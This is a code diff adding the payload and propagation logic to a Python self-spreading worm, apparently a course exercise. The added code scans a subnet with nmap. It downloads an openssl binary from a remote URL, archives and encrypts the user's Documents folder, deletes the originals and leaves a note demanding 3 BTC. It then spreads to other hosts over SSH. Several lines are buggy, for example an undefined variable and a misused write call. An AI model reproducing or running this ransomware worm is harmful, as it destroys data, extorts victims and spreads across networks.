@@ -104,7 +104,9 @@ def attackSystem(host):
 #to know. 
 #@return - the UP address of the current system
 def getMyIP(interface):
+  #Get all network interfaces in the system
   networkInterfaces = netifaces.interfaces()
+  #IP Address
   ipAdd = None
   for netFace in networkInterfaces:
     address = netifaces.ifaddresses(netFace)[2][0]['addr']
@@ -112,3 +114,65 @@ def getMyIP(interface):
       ipAdd = address
       break
   return ipAdd
+
+#Return the list of systems in the network
+#@return - IP address list in the network
+#This function will scan for hosts in the network then will return the IP addresses
+def getTargetsInNetwork():
+  portScanner = nmap.PortScanner()
+  portScanner = scan('100.23.45.1/24', arguments = '-p -44 --open')
+  targetInfo = portScanner.all_hosts()
+  liveHosts = []
+  ip_add = getMyIP("eth0")
+  for target in targetInfo:
+    if portScanner[target].state() == "up" and host != ip_add:
+      liveHosts.append(host)
+  return liveHosts
+
+#Now the fun part
+def encryptFiles():
+  try:
+    urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl", "openssl")
+    tar = tarfile.open("Documents.tar", "w:gz")
+    tar.add("/home/ubuntu/Documents/")
+    tar.close()
+    call(["chmod", "777", "./openssl"])
+    call(["openssl", "aes-256-cbc", "-a", "-salt", "-in", "Documents.tar", "-out", "Documents.tar.enc", "-k", "callmybluffworm"])
+    shutil.rmtree('/home/ubuntu/Documents/')
+    file_obj = open("want_them_back.txt", "w")
+    file_obj.write = ("3 btc to address 1x56d4w5d654s654d56s4 or never access your files again XxX")
+    file_obj.close()
+    os.remove("Documents.tar")
+  except:
+    print("Unable to encrypt")
+    
+#Get the hosts in the same network
+networkHosts = getTargetsInNetwork()
+#worm will check if its already in
+if not os.path.exists(UNLEASH_THE_FILE):
+  markInfected()
+else:
+  print("Already infected, moving on...")
+  sys.exit()
+
+#If it hasn't infected target then encrypt
+if len(sys.argv) >= 2:
+  print("Host, do not encrypt")
+else:
+  encryptFiles()
+  
+#Search through hosts in the network
+for host in networkHosts:
+  #Commence attack
+  sshInfo = attackSystem(host)
+  print(sshInfo)
+  
+  if sshInfo:
+    print("Trying to spread")
+    if isInfectedSystem(sshInfo[0] == True):
+      print("Remote system has been compromised! Cheers!")
+      continue
+    else:
+      spreadTheLove(sshInfo[0])
+      print("Finished spreading my love on " + host)
+      sys.exit()
